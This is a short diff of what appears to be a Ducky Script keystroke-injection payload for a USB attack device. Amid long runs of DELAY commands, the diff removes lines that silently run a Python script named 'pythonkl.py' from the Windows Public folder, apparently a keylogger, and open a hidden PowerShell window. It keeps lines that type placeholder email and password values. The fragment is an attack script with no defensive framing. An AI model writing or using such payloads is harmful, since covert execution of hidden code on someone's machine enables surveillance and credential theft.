@@ -18,12 +18,7 @@ DELAY 10000
 DELAY 10000
 DELAY 10000
 DELAY 10000
-STRING pythonw 'C:\Users\Public\pythonkl.py'
-ENTER
 DELAY 10000
 STRING emailhere
 DELAY 2000
 STRING passwordhere
-ENTER
-STRING powershell -WindowStyle Hidden
-ENTER
